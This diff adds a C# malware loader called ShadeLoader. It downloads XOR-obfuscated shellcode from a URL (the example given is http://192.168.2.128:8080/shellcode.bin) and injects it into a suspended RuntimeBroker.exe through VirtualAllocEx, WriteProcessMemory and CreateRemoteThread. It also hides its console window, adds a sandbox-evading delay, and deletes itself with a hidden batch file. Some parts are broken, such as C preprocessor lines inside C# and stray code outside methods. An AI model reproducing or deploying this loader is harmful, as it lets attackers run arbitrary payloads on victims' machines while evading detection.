@@ -1,0 +1,345 @@
+#define NOMINMAX
+#define _CRT_SECURE_NO_WARNINGS
+
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+
+namespace ShadeLoader
+{
+    class Program
+    {
+        // Print the first 64 bytes
+        static void PrintBytes(byte[] data, int len)
+        {
+#if ENABLE_DEBUG
+            for (int i = 0; i < len; ++i)
+            {
+                if (i % 16 == 0) Console.WriteLine();
+                Console.Write($"{data[i]:X2} ");
+            }
+            Console.WriteLine();
+#endif
+        }
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        static void Main(string[] args)
+        {
+            IntPtr hWnd = GetConsoleWindow();
+            if (ENABLE_DEBUG && hWnd != IntPtr.Zero)
+            {
+                ShowWindow(hWnd, SW_SHOW);
+            }
+            else
+            {
+                ShowWindow(hWnd, SW_HIDE);
+            }
+
+            Console.WriteLine("[+] Starting");
+
+#if PROTECTION
+            if (Protection())
+            {
+                Console.WriteLine("[-] Suspicious environment detected");
+                SelfDelete();
+                return;
+            }
+#endif
+
+            DelayExecution();
+
+#if SUSPEND_DOWNLOAD
+            Thread.Sleep(0); // Sleeping time before downloading shellcode
+            Console.WriteLine("[+] Delay execution complete.");
+#endif
+
+            string url = "http://192.168.2.128:8080/shellcode.bin"; // Replace with your URL
+            byte[] obfuscatedPayload = DownloadPayload(url);
+
+            if (obfuscatedPayload == null || obfuscatedPayload.Length == 0)
+            {
+                Console.WriteLine("[-] Failed to download payload");
+                return;
+            }
+            Console.WriteLine("[+] Payload downloaded successfully. Size: " + obfuscatedPayload.Length + " bytes.");
+
+            byte[] key = Encoding.ASCII.GetBytes("ShadeLoader"); // Replace with your key
+
+            XorEncryptDecrypt(obfuscatedPayload, key);
+
+            Console.WriteLine("[+] Decrypted payload");
+            PrintBytes(obfuscatedPayload, Math.Min(obfuscatedPayload.Length, 64));
+
+            // Inject shellcode into the target process
+            if (!InjectShellcode(obfuscatedPayload))
+            {
+                Console.WriteLine("[-] Shellcode injection failed");
+                return;
+            }
+            Console.WriteLine("[+] Shellcode injected successfully");
+
+#if AUTODESTRUCT
+            SelfDelete();
+#endif
+
+            Console.WriteLine("[+] Cleanup complete");
+        }
+
+        static byte[] DownloadPayload(string url)
+        {
+            using (WebClient client = new WebClient())
+            {
+                try
+                {
+                    return client.DownloadData(url);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("Download failed: " + ex.Message);
+                    return null;
+                }
+            }
+        }
+
+        static void XorEncryptDecrypt(byte[] data, byte[] key)
+        {
+            for (int i = 0; i < data.Length; i++)
+            {
+                data[i] ^= key[i % key.Length];
+            }
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct STARTUPINFO
+        {
+            public int cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public int dwX;
+            public int dwY;
+            public int dwXSize;
+            public int dwYSize;
+            public int dwXCountChars;
+            public int dwYCountChars;
+            public int dwFillAttribute;
+            public int dwFlags;
+            public short wShowWindow;
+            public short cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        private const uint CREATE_SUSPENDED = 0x00000004;
+        private const uint CREATE_NO_WINDOW = 0x08000000;
+        private const uint MEM_COMMIT = 0x00001000;
+        private const uint MEM_RESERVE = 0x00002000;
+        private const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CreateProcess(
+            string lpApplicationName,
+            string lpCommandLine,
+            IntPtr lpProcessAttributes,
+            IntPtr lpThreadAttributes,
+            bool bInheritHandles,
+            uint dwCreationFlags,
+            IntPtr lpEnvironment,
+            string lpCurrentDirectory,
+            ref STARTUPINFO lpStartupInfo,
+            out PROCESS_INFORMATION lpProcessInformation
+        );
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr VirtualAllocEx(
+            IntPtr hProcess,
+            IntPtr lpAddress,
+            uint dwSize,
+            uint flAllocationType,
+            uint flProtect
+        );
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool WriteProcessMemory(
+            IntPtr hProcess,
+            IntPtr lpBaseAddress,
+            byte[] lpBuffer,
+            uint nSize,
+            out IntPtr lpNumberOfBytesWritten
+        );
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr CreateRemoteThread(
+            IntPtr hProcess,
+            IntPtr lpThreadAttributes,
+            uint dwStackSize,
+            IntPtr lpStartAddress,
+            IntPtr lpParameter,
+            uint dwCreationFlags,
+            out uint lpThreadId
+        );
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+
+
+        static bool InjectShellcode(byte[] shellcode)
+        {
+            // This function should implement process hollowing or any other injection method.
+            // Requires additional unsafe code and platform-specific API calls.
+            STARTUPINFO si = new STARTUPINFO();
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            si.cb = Marshal.SizeOf(si);
+
+            string targetProcess = @"C:\Windows\System32\RuntimeBroker.exe";
+
+            if (!CreateProcess(null, targetProcess, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED | CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
+            {
+                Console.WriteLine("[-] CreateProcess failed: " + Marshal.GetLastWin32Error());
+                return false;
+            }
+            Console.WriteLine("[+] Target process created successfully. Process ID: " + pi.dwProcessId);
+
+            IntPtr execMem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            if (execMem == IntPtr.Zero)
+            {
+                Console.WriteLine("[-] VirtualAllocEx failed: " + Marshal.GetLastWin32Error());
+                TerminateProcess(pi.hProcess, 1);
+                return false;
+            }
+            Console.WriteLine("[+] Memory allocated in the target process at address: " + execMem);
+
+            IntPtr bytesWritten;
+            if (!WriteProcessMemory(pi.hProcess, execMem, shellcode, (uint)shellcode.Length, out bytesWritten))
+            {
+                Console.WriteLine("[-] WriteProcessMemory failed: " + Marshal.GetLastWin32Error());
+                TerminateProcess(pi.hProcess, 1);
+                return false;
+            }
+            Console.WriteLine("[+] Shellcode written to memory successfully.");
+
+            uint threadId;
+            IntPtr hThread = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, execMem, IntPtr.Zero, 0, out threadId);
+            if (hThread == IntPtr.Zero)
+            {
+                Console.WriteLine("[-] CreateRemoteThread failed: " + Marshal.GetLastWin32Error());
+                TerminateProcess(pi.hProcess, 1);
+                return false;
+            }
+            Console.WriteLine("[+] Remote thread created successfully. Thread ID: " + threadId);
+
+            if (ResumeThread(pi.hThread) == uint.MaxValue)
+            {
+                Console.WriteLine("[-] ResumeThread failed: " + Marshal.GetLastWin32Error());
+                CloseHandle(hThread);
+                TerminateProcess(pi.hProcess, 1);
+                return false;
+            }
+            Console.WriteLine("[+] Main thread of the target process resumed.");
+
+            CloseHandle(hThread);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            return true;
+        }
+
+
+
+        //Console.WriteLine("Injection function is not implemented in this sample.");
+        //    return false;
+        //}
+
+        static void DelayExecution()
+        {
+            for (int i = 2; i <= 2000000; ++i)
+            {
+                bool isPrime = true;
+                for (int j = 2; j <= Math.Sqrt(i); ++j)
+                {
+                    if (i % j == 0)
+                    {
+                        isPrime = false;
+                        break;
+                    }
+                }
+            }
+        }
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        private static extern int GetModuleFileName(IntPtr hModule, StringBuilder lpFilename, int nSize);
+
+        [DllImport("kernel32.dll")]
+        private static extern int GetTempPath(int nBufferLength, StringBuilder lpBuffer);
+
+        static bool SelfDelete()
+        {
+            StringBuilder path = new StringBuilder(260); // MAX_PATH is 260
+            GetModuleFileName(IntPtr.Zero, path, path.Capacity);
+
+            StringBuilder tempPath = new StringBuilder(260);
+            GetTempPath(tempPath.Capacity, tempPath);
+            string batchPath = Path.Combine(tempPath.ToString(), "00.bat");
+
+            using (StreamWriter batchFile = new StreamWriter(batchPath))
+            {
+                batchFile.WriteLine(":Repeat");
+                batchFile.WriteLine($"del \"{path}\"");
+                batchFile.WriteLine($"if exist \"{path}\" goto Repeat");
+                batchFile.WriteLine("del \"%~f0\"");
+            }
+
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = batchPath,
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true
+            });
+
+            return false;
+        }
+
+#if AUTODESTRUCT
+    Console.WriteLine("SELF DELETED");
+    SelfDelete();
+#endif
+
+        static bool Protection()
+        {
+            // Implement protection checks if needed
+            return false;
+        }
+
+        // Constants
+        const bool ENABLE_DEBUG = true;
+        const bool PROTECTION = true;
+        const bool AUTODESTRUCT = true;
+        const int SW_SHOW = 5;
+        const int SW_HIDE = 0;
+    }
+}
